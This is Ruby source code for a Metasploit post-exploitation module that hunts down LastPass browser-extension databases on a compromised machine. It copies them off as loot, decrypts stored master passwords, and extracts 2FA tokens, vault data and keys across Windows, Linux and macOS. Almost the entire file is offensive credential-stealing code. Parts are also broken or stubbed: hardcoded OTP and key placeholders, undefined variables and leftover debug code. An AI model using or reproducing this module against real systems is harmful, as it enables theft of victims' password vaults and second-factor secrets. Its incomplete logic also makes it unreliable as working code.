require 'msf/core'
require 'base64'
require 'sqlite3'
require 'uri'

class Metasploit3 < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::OSX::System
  include Msf::Post::Unix

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'LastPass Master Password Extractor',
        'Description' => 'This module extracts and decrypts LastPass master login accounts and passwords',
        'License' => MSF_LICENSE,
        'Author' => [
          'Alberto Garcia Illera <agarciaillera[at]gmail.com>', # original module and research
          'Martin Vigo <martinvigo[at]gmail.com>', # original module and research
          'Jon Hart <jon_hart[at]rapid7.com' # module rework and cleanup
        ],
        'Platform' => %w(linux osx unix win),
        'References'   => [['URL', 'http://www.martinvigo.com/a-look-into-lastpass/']],
        'SessionTypes' => %w(meterpreter shell)
      )
    )
  end

  def run
    if session.platform =~ /win/ && session.type == "shell" # No Windows shell support
      print_error "Shell sessions on Windows are not supported"
      return
    end

    print_status "Searching for LastPass databases"

    account_map = build_account_map
    if account_map.empty?
      print_status "No databases found"
      return
    end

    print_status "Extracting credentials"
    extract_credentials(account_map)

    print_status "Extracting 2FA tokens"
    extract_2fa_tokens(account_map)

    print_status "Extracting encryption keys"
    extract_keys(account_map)

    print_status "Extracting vault and iterations"                           
    extract_vault_and_iterations(account_map)

    print_lastpass_data(account_map)
  end


  # Returns a mapping of lastpass accounts
  def build_account_map
    platform = session.platform
    profiles = user_profiles
    account_map = {}

    profiles.each do |user_profile|
      account = user_profile['UserName']
      browser_path_map = {}
      localstorage_path_map = {}

      case platform
      when /win/
        browser_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
          'Firefox' => "#{user_profile['AppData']}\\Mozilla\\Firefox\\Profiles",
          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\databases\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0",
          'Safari' => "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\Databases\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
        }
        localstorage_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\Local Storage\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
          'Firefox' => "#{user_profile['LocalAppData']}\\LastPass",
          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\Local Storage\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage",
          'Safari' => "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\LocalStorage\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0.localstorage"
        }
      when /unix|linux/
        browser_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
          'Firefox' => "#{user_profile['LocalAppData']}/.mozilla/firefox",
          'Opera' => "#{user_profile['LocalAppData']}/.config/Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
        }
        localstorage_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/Local Storage/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
          'Firefox' => "#{user_profile['LocalAppData']}/.lastpass",
          'Opera' => "#{user_profile['LocalAppData']}/.config/Opera/Local Storage/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage"
        }
      when /osx/
        browser_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
          'Firefox' => "#{user_profile['LocalAppData']}/Firefox/Profiles",
          'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0",
          'Safari' => "#{user_profile['AppData']}/Safari/Databases/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
        }
        localstorage_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/Local Storage/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
          'Firefox' => "#{user_profile['LocalAppData']}/LastPass",
          'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/Local Storage/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage",
          'Safari' => "#{user_profile['AppData']}/Safari/LocalStorage/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0.localstorage"
        }
      else
        print_error "Platform not recognized: #{platform}"
      end

      account_map[account] = {}
      browser_path_map.each_pair do |browser, path|
        account_map[account][browser] = {}
        db_paths = find_db_paths(path, browser, account)
        if db_paths && db_paths.size > 0
          account_map[account][browser]['lp_db_path'] = db_paths
          account_map[account][browser]['localstorage_db'] = localstorage_path_map[browser] if client.fs.file.exists?(localstorage_path_map[browser]) || browser == 'Firefox'
        else
          account_map[account].delete(browser)
        end
      end
    end

    account_map
  end

  # Returns a list of DB paths found in the victims' machine
  def find_db_paths(path, browser, account)
    paths = []

    vprint_status "Checking #{account}'s #{browser}"
    if browser == "Firefox" # Special case for Firefox
      profiles = firefox_profile_files(path, browser)
      paths |= profiles
    else
      paths |= file_paths(path, browser, account)
    end

    vprint_good "Found #{paths.size} #{browser} databases for #{account}"
    paths
  end

  # Returns the relevant information from user profiles
  def user_profiles
    user_profiles = []
    case session.platform
    when /unix|linux/
      if session.type == "meterpreter"
        user_names = client.fs.dir.entries("/home")
      else
        user_names = session.shell_command("ls /home").split
      end
      user_names.reject! { |u| %w(. ..).include?(u) }
      user_names.each do |user_name|
        user_profiles.push('UserName' => user_name, "LocalAppData" => "/home/#{user_name}")
      end
    when /osx/
      user_names = session.shell_command("ls /Users").split
      user_names.reject! { |u| u == 'Shared' }
      user_names.each do |user_name|
        user_profiles.push(
          'UserName' => user_name,
          "AppData" => "/Users/#{user_name}/Library",
          "LocalAppData" => "/Users/#{user_name}/Library/Application Support"
        )
      end
    when /win/
      user_profiles |= grab_user_profiles
    else
      print_error "OS not recognized: #{os}"
    end
    user_profiles
  end

  # Extracts the databases paths from the given folder ignoring . and ..
  def file_paths(path, browser, account)
    found_dbs_paths = []

    files = []
    if directory?(path)
      sep = session.platform =~ /win/ ? '\\' : '/'
      if session.type == "meterpreter"
        files = client.fs.dir.entries(path)
      elsif session.type == "shell"
        files = session.shell_command("ls \"#{path}\"").split
      else
        print_error "Session type not recognized: #{session.type}"
        return found_dbs_paths
      end
    end
    files.each do |file_path|
      unless %w(. .. Shared).include?(file_path)
        found_dbs_paths.push([path, file_path].join(sep))
      end
    end

    found_dbs_paths
  end

  # Returns the profile files for Firefox
  def firefox_profile_files(path, browser)
    found_dbs_paths = []

    if directory?(path)
      sep = session.platform =~ /win/ ? '\\' : '/'
      if session.type == "meterpreter"
        files = client.fs.dir.entries(path)
      elsif session.type == "shell"
        files = session.shell_command("ls \"#{path}\"").split
      else
        print_error "Session type not recognized: #{session.type}"
        return found_dbs_paths
      end

      files.reject! { |file| %w(. ..).include?(file) }
      files.each do |file_path|
        found_dbs_paths.push([path, file_path, 'prefs.js'].join(sep)) if file_path.match(/.*\.default/)
      end
    end

    found_dbs_paths
  end

  # Parses the Firefox preferences file and returns encoded credentials
  def firefox_credentials(loot_path)
    credentials = []
    File.readlines(loot_path).each do |line|
      if /user_pref\("extensions.lastpass.loginusers", "(?<encoded_users>.*)"\);/ =~ line
        usernames = encoded_users.split("|")
        usernames.each do |username|
          credentials << [username, "NOT_FOUND"]
        end
      elsif /user_pref\("extensions.lastpass.loginpws", "(?<encoded_creds>.*)"\);/ =~ line
        creds_per_user = encoded_creds.split("|")
        creds_per_user.each do |user_creds|
          parts = user_creds.split('=')
          for creds in credentials # Check if we have the username already
            if creds[0] == parts[0]
              creds[1] = parts[1] # Add the password to the existing username
            else
              credentials << parts if parts.size > 1 # Add full credentials
            end
          end
        end
      else
        next
      end
    end

    credentials
  end

  # Decrypts the password
  def clear_text_password(email, encrypted_data)
    return if encrypted_data.blank?

    decrypted_password = "DECRYPTION_ERROR"

    sha256_hex_email = OpenSSL::Digest::SHA256.hexdigest(email)
    sha256_binary_email = [sha256_hex_email].pack "H*" # Do hex2bin

    if encrypted_data.include?("|") # Use CBC
      decipher = OpenSSL::Cipher.new("AES-256-CBC")
      decipher.decrypt
      decipher.key = sha256_binary_email # The key is the emails hashed to SHA256 and converted to binary
      decipher.iv = Base64.decode64(encrypted_data[1, 24]) # Discard ! and |
      encrypted_password = encrypted_data[26..-1]
    else # Use ECB
      decipher = OpenSSL::Cipher.new("AES-256-ECB")
      decipher.decrypt
      decipher.key = sha256_binary_email
      encrypted_password = encrypted_data
    end

    begin
      decrypted_password = decipher.update(Base64.decode64(encrypted_password)) + decipher.final
    rescue
      vprint_error "Password for #{email} could not be decrypted"
    end

    decrypted_password
  end

  def extract_credentials(account_map)
    account_map.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, paths|
        account_map[account][browser]['lp_creds'] = {}
        if browser == 'Firefox'
          paths['lp_db_path'].each do |path|
            data = read_file(path)
            loot_path = store_loot(
              'firefox.preferences',
              'text/javascript',
              session,
              data,
              nil,
              "Firefox preferences file #{path}"
            )

            # Extract usernames and passwords from preference file
            ffcreds = firefox_credentials(loot_path)
            unless ffcreds.blank?
              ffcreds.each do |creds|
                creds[1].blank? ? creds[1] = "NOT_FOUND" : creds[1] = clear_text_password(URI.unescape(creds[0]), URI.unescape(creds[1])) #Decrypt credentials
                credentials[account][browser][URI.unescape(creds[0])] = [URI.unescape(creds[1])]
              end
            else
              credentials[account].delete("Firefox")
            end

          end
        else # Chrome, Safari and Opera
          paths['lp_db_path'].each do |path|
            data = read_file(path)
            loot_path = store_loot(
              "#{browser.downcase}.lastpass.database",
              'application/x-sqlite3',
              session,
              data,
              nil,
              "#{account}'s #{browser} LastPass database #{path}"
            )
            account_map[account][browser]['lp_db_loot'] = loot_path

            # Parsing/Querying the DB
            db = SQLite3::Database.new(loot_path)
            result = db.execute(
              "SELECT username, password FROM LastPassSavedLogins2 " \
              "WHERE username IS NOT NULL AND username != '' " \
            )

            for row in result
              if row[0]
                row[1].blank? ? row[1] = "NOT_FOUND" : row[1] = clear_text_password(row[0], row[1]) #Decrypt credentials
                account_map[account][browser]['lp_creds'][row[0]] = {'lp_password' => row[1]}
              end
            end
          end
        end
      end
    end
  end


  #Extracts the 2FA token from localStorage
  def extract_2fa_tokens(account_map)
    account_map.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, lp_data|
        if browser == 'Firefox'
          lastpass_data[account][browser].each_pair do |username, user_data|
            path = path + client.fs.file.separator + "lp.suid"
            data = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
            data = "DECRYPTION_ERROR" if (data.blank? || data.size != 32) # Verify content
            loot_path = store_loot(
              'firefox.preferences',
              'text/binary',
              session,
              data,
              nil,
              "Firefox 2FA token file #{path}"
            )
            lastpass_data[account][browser][username] << data

          end
          
        else # Chrome, Safari and Opera
          data = read_file(lp_data['localstorage_db'])
          loot_path = store_loot(
            "#{browser.downcase}.lastpass.localstorage",
            'application/x-sqlite3',
            session,
            data,
            nil,
            "#{account}'s #{browser} LastPass localstorage #{lp_data['localstorage_db']}"
          )

          # Parsing/Querying the DB
          db = SQLite3::Database.new(loot_path)
          token = db.execute(
            "SELECT hex(value) FROM ItemTable " \
            "WHERE key = 'lp.uid';"
          ).flatten

          token.blank? ? account_map[account][browser]['lp_2fa'] = "NOT_FOUND" : account_map[account][browser]['lp_2fa'] = token.pack('H*')
        end
      end
    end
  end


  #Print all extracted LastPass data
  def print_lastpass_data(account_map)
    lastpass_data_table = Rex::Ui::Text::Table.new(
      'Header' => "LastPass data",
      'Indent' => 1,
      'Columns' => %w(Account Browser LP_Username LP_Password LP_2FA LP_Key)
    )

    account_map.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, lp_data|
        lp_data['lp_creds'].each_pair do |username, user_data|
          lastpass_data_table << [account, browser, username, user_data['lp_password'], lp_data['lp_2fa'], user_data['vault_key']]
        end
      end
    end

    unless account_map.empty?
      print_good lastpass_data_table.to_s
      path = store_loot(
        "lastpass.data",
        "text/csv",
        session,
        lastpass_data_table.to_csv,
        nil,
        "LastPass Data"
      )
    end
  end


  def extract_vault_and_iterations(account_map)
    account_map.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, lp_data|
        lp_data['lp_creds'].each_pair do |username, user_data|
          if browser == 'Firefox'
            path = firefox_map[account][browser] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_key.itr"
            data = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
            data = "NOT FOUND" if data.blank? # Verify content
            lastpass_data[account][browser][username] << data

          else # Chrome, Safari and Opera
            db = SQLite3::Database.new(lp_data['lp_db_loot'])
            result = db.execute(
              "SELECT data FROM LastPassData " \
              "WHERE username_hash = '"+OpenSSL::Digest::SHA256.hexdigest(username)+"' AND type = 'accts'"
            )

            if result.size == 1 && !result[0].blank?
              if  /iterations=(?<iterations>.*);(?<vault>.*)/ =~ result[0][0]
                lp_data['lp_creds'][username]['iterations'] = iterations
                loot_path = store_loot(
                  "#{browser.downcase}.lastpass.vault",
                  'text/plain',
                  session,
                  vault,
                  nil,
                  "#{account}'s #{browser} LastPass Vault #{lp_data['lp_db_loot']}"
                )
                lp_data['lp_creds'][username]['vault_loot'] = loot_path
              else
                lp_data['lp_creds'][username]['iterations'] = 1
                loot_path = store_loot(
                  "#{browser.downcase}.lastpass.vault",
                  'text/plain',
                  session,
                  result[0][0],
                  nil,
                  "#{account}'s #{browser} LastPass Vault #{lp_data['lp_db_loot']}"
                )
                lp_data['lp_creds'][username]['vault_loot'] = loot_path
              end
            else
              lp_data['lp_creds'][username]['iterations'] = "NOT_FOUND"
              lp_data['lp_creds'][username]['vault_loot'] = "NOT_FOUND"
            end
          end
        end
      end
    end
  end




  def extract_keys(account_map)
    account_map.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, lp_data|
        lp_data['lp_creds'].each_pair do |username, user_data|
          otp, encrypted_key = extract_otp_and_encrypted_key(account, browser, username, lp_data['lp_db_loot'])
          #otp_token = OpenSSL::Digest::SHA256.hexdigest( OpenSSL::Digest::SHA256.hexdigest( username + otp ) + otp )
          otp = "7b88275911a8efc3efe50a3bda6ac202"
          otpbin = [otp].pack "H*"
          otp_token = lastpass_sha256( lastpass_sha256( username + otpbin ) + otpbin )
          lp_data['lp_creds'][username]['vault_key'] = decrypt_vault_key(username, otp_token, encrypted_key)


        end
      end
    end
  end


  # Returns otp, encrypted_key
  def extract_otp_and_encrypted_key(account, browser, username, path)    
    if browser == 'Firefox'
      path = firefox_map[account][browser] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_ff.sotp"
      otp = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
      otp = "NOT FOUND" if otp.blank? # Verify content

      path = firefox_map[account][browser] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_lpall.slps"
      encrypted_key = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
      encrypted_key = "NOT FOUND" if encrypted_key.blank? # Verify content
      data = encrypted_key.split("\r")[0]
      return [otp, encrypted_key] 
    else # Chrome, Safari and Opera
      db = SQLite3::Database.new(path)
      result = db.execute(
        "SELECT type, data FROM LastPassData " \
        "WHERE username_hash = '"+OpenSSL::Digest::SHA256.hexdigest(username)+"' AND type IN ('otp', 'key')"
      )

      if result.size == 2
        if result[0][0] == "otp"
          return result[0][1], result[1][1] 
        else 
          return result[1][1], result[0][1] 
        end
      end

      return "", ""
    end
  end


  def decrypt_vault_key(username, token, encrypted_key)
    return "adecryptionkey"

  end


  # LastPass does some preprocessing (UTF8) when doing a SHA256 on special chars (binary)
  def lastpass_sha256(input)
    output = ""

    input.split("").each do |char|
      digit = char.ord
      if (digit <= 128)
        output += digit.chr
      else
        output += (digit >> 6 | 192).chr
        output += (digit >> 6 & 63 | 128).chr
        output += (digit & 63 | 128).chr
      end
    end

    #Nasty hack to switch Windows /r/n for /n
    output = output.delete 130.chr+131.chr
    output << 130.chr

    return OpenSSL::Digest::SHA256.hexdigest(output)
  end


  def lastpass_sha256_test(input)
    input = "7b88275911a8efc3efe50a3bda6ac202"
    input = [input].pack "H*"
    output = ""
    #inputbin = [input].pack "H*"
    puts input
    input.split("").each do |char|
      digit = char.ord
      if (digit <= 128)
        output += digit.chr
      else
        output += (digit >> 6 | 192).chr
        output += (digit >> 6 & 63 | 128).chr
        output += (digit & 63 | 128).chr
      end
      
    end

    input.split("").each do |char|
      puts char.ord
    end
    puts OpenSSL::Digest::SHA256.hexdigest(output)
    #return

    #Nasty hack to switch Windows /r/n for /n
    #output = output.delete 130.chr+131.chr
    #output << 130.chr

    return OpenSSL::Digest::SHA256.hexdigest(output)
  end



end
